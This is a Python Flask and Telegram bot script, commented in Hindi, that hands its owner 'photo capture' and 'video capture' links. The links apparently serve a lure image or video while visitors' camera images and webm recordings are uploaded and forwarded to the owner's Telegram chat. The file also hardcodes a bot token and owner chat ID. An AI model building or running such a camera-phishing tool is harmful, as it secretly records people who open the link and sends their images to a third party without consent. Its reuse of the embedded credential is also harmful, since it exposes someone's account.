import os
import base64
import uuid
import threading
import logging
from flask import Flask, request, render_template, send_from_directory
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import requests
import waitress

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8818489453:AAH56Vc2bNRKcRjXgx1paBjbuHWamiC-ibs"
OWNER_CHAT_ID = "6464233947"
BASE_URL = os.getenv("BASE_URL", "http://localhost:5000")

app = Flask(__name__)
link_data = {}   # unique_id -> { "owner": chat_id, "media_type": "photo" या "video", "filename": file name }

# ---------- स्टैटिक फ़ाइलें सर्व करें ----------
@app.route('/photos/<filename>')
def serve_photo(filename):
    return send_from_directory('static', filename)

@app.route('/videos/<filename>')
def serve_video(filename):
    return send_from_directory('static/videos', filename)

# ---------- फ़ोटो पेज (पहले जैसा) ----------
@app.route('/image/<unique_id>')
def image(unique_id):
    if unique_id not in link_data:
        return "Invalid or expired link.", 404
    photo_url = f"/photos/{link_data[unique_id]['filename']}"
    return render_template('camera.html', unique_id=unique_id, photo_url=photo_url)

# ---------- नया वीडियो पेज ----------
@app.route('/video_page/<unique_id>')
def video_page(unique_id):
    if unique_id not in link_data:
        return "Invalid or expired link.", 404
    video_url = f"/videos/{link_data[unique_id]['filename']}"
    return render_template('video.html', unique_id=unique_id, video_url=video_url)

# ---------- फ़ोटो अपलोड (विज़िटर की ओर से) ----------
@app.route('/upload/<unique_id>', methods=['POST'])
def upload_photo(unique_id):
    if unique_id not in link_data:
        return {"status": "error"}, 400
    owner_id = link_data[unique_id]["owner"]
    data = request.get_json()
    if not data or 'image' not in data:
        return {"status": "error"}, 400
    image_b64 = data['image']
    if ',' in image_b64:
        image_b64 = image_b64.split(',')[1]
    image_bytes = base64.b64decode(image_b64)
    temp_file = f"temp_{unique_id}.jpg"
    with open(temp_file, "wb") as f:
        f.write(image_bytes)
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(temp_file, 'rb') as photo:
        files = {'photo': photo}
        payload = {'chat_id': owner_id}
        resp = requests.post(url, files=files, data=payload)
    os.remove(temp_file)
    return {"status": "ok"}, 200 if resp.status_code == 200 else 500

# ---------- वीडियो अपलोड (विज़िटर की ओर से) ----------
@app.route('/upload_video/<unique_id>', methods=['POST'])
def upload_video(unique_id):
    if unique_id not in link_data:
        return {"status": "error"}, 400
    owner_id = link_data[unique_id]["owner"]
    if 'video' not in request.files:
        return {"status": "error"}, 400
    video_file = request.files['video']
    temp_file = f"temp_video_{unique_id}.webm"
    video_file.save(temp_file)
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
    with open(temp_file, 'rb') as vid:
        files = {'video': vid}
        payload = {'chat_id': owner_id, 'caption': '🎥 Visitor video'}
        resp = requests.post(url, files=files, data=payload)
    os.remove(temp_file)
    return {"status": "ok"}, 200 if resp.status_code == 200 else 500

@app.route('/health')
def health():
    return "OK", 200

# ---------- टेलीग्राम बॉट हैंडलर्स ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Send me a **photo** to get a photo capture link.\n"
        "Send me a **video** to get a video capture link."
    )

# फ़ोटो हैंडलर (पहले जैसा)
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    if str(user.id) != OWNER_CHAT_ID:
        await update.message.reply_text("❌ Only the owner can generate links.")
        return

    try:
        photo_file = await update.message.photo[-1].get_file()
        unique_id = uuid.uuid4().hex[:10]
        os.makedirs("static", exist_ok=True)
        filename = f"{unique_id}.jpg"
        await photo_file.download_to_drive(f"static/{filename}")
        logging.info(f"Photo saved: static/{filename}")

        link_data[unique_id] = {"owner": OWNER_CHAT_ID, "media_type": "photo", "filename": filename}

        web_app_url = f"{BASE_URL}/image/{unique_id}"
        keyboard = [[InlineKeyboardButton("📸 Open Photo", web_app=WebAppInfo(url=web_app_url))]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"🔗 Photo link:\n{web_app_url}",
            reply_markup=reply_markup
        )
    except Exception as e:
        logging.error(f"Failed to process photo: {e}")
        await update.message.reply_text("❌ Something went wrong, try another photo.")

# नया वीडियो हैंडलर
async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    if str(user.id) != OWNER_CHAT_ID:
        await update.message.reply_text("❌ Only the owner can generate links.")
        return

    try:
        video_file = await update.message.video.get_file()
        unique_id = uuid.uuid4().hex[:10]
        os.makedirs("static/videos", exist_ok=True)
        # टेलीग्राम से डाउनलोड होने वाली वीडियो का एक्सटेंशन .mp4 हो सकता है
        ext = os.path.splitext(video_file.file_path)[1] or ".mp4"
        filename = f"{unique_id}{ext}"
        await video_file.download_to_drive(f"static/videos/{filename}")
        logging.info(f"Video saved: static/videos/{filename}")

        link_data[unique_id] = {"owner": OWNER_CHAT_ID, "media_type": "video", "filename": filename}

        web_app_url = f"{BASE_URL}/video_page/{unique_id}"
        keyboard = [[InlineKeyboardButton("🎬 Open Video", web_app=WebAppInfo(url=web_app_url))]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"🎥 Video link:\n{web_app_url}",
            reply_markup=reply_markup
        )
    except Exception as e:
        logging.error(f"Failed to process video: {e}")
        await update.message.reply_text("❌ Something went wrong, try another video.")

def run_bot():
    app_bot = Application.builder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app_bot.add_handler(MessageHandler(filters.VIDEO, handle_video))   # नया
    print("🤖 Bot polling started...")
    app_bot.run_polling()

if __name__ == '__main__':
    flask_thread = threading.Thread(
        target=waitress.serve,
        args=(app,),
        kwargs={'host': '0.0.0.0', 'port': 5000},
        daemon=True
    )
    flask_thread.start()
    print("🌐 Flask server starting in background...")
    run_bot()
